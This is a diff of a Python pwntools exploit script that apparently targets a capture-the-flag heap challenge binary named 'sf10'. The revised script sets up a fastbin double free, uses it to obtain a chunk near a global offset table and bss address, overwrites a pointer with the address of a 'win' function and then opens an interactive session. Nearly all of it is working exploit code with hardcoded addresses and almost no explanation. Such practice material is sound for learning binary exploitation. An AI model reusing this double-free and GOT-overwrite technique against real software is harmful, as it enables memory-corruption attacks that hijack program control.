@@ -1,52 +1,41 @@
-from pwn import*
+from pwn import *
+
 p = process('./sf10')
-t = 0.05
 
-# gadget
+def choice(index):
+	p.sendline(str(index))
 
-sys_func = 0x400946
-put_got = 0x602020
-bss = 0x6020c0
-bss_stdout = 0x6020a0
-bss_stdin = 0x6020a8
-win_func = 0x400946
-target = 0x602035
-
-### defintion
-
-def add(index,length,content):
-	p.sendlineafter('2 delete \n','1');sleep(t)
-	p.sendlineafter('(0-11):',str(index));sleep(t)
-	p.sendlineafter('Length:',str(length));sleep(t)
-	p.sendlineafter('C:',content);sleep(t)
+def add(index, length, content):
+	choice(1)
+	p.sendlineafter("(0-11):",str(index))
+	p.sendlineafter("Length:",str(length))
+	p.sendlineafter("C:",content)
 
 def delete(index):
-	p.sendlineafter('2 delete \n','2');sleep(t)
-	p.sendlineafter('(0-11):',str(index));sleep(t)
+	choice(2)
+	p.sendlineafter("(0-11):",str(index))
 
-### exploit
-add(0,0x60,'a'*0x8)
-add(1,0x60,'b'*0x8)
-add(2,0x30,'c'*0x8)
-add(3,0x30,'d'*0x8)
-add(4,0x30,'e'*0x8)
-delete(0)	
+stdout = 0x6020A0
+
+target = 0x602080-0x8+0x2
+
+ptr = 0x6020C0	#pointer
+win = 0x400946
+
+add(0, 0x30, "a"*8)
+add(1, 0x30, "b"*8)
+add(2, 0x30, "c"*8)
+
+add(11, 0x200, p64(0)*2+p64(win)*60)
+
+#Double Free Bug
+delete(0)
 delete(1)
 delete(0)
-delete(2)
-delete(3)
-delete(2)
-# fake stdout struct in bss
-add(0,0x60,p64(bss_stdin+0x5))
-add(0,0x60,'a'*0x8)
-add(0,0x60,'a'*0x8)
-add(0,0x60,p64(0)*2+p64(win_func)*9+p64(bss_stdin+0x5))
+add(4, 0x30, p64(target)) 	# 0x602082 - 0x8
+add(5, 0x30, "X"*8)		# ????
+add(6, 0x30, "e"*8)		# into exit_got+2
 
-# fake chunk size 0x40
-
-add(2,0x30,p64(bss_stdin-0x2e))
-add(2,0x30,'c'*0x8)
-add(2,0x30,'c'*0x8)
-#add(2,0x30, 'X'*8)
-
+raw_input()
+add(7, 0x30, p64(0)*2 + '\x00'*6 +p64(ptr + 0x8*11 - 0xd8))
 p.interactive()
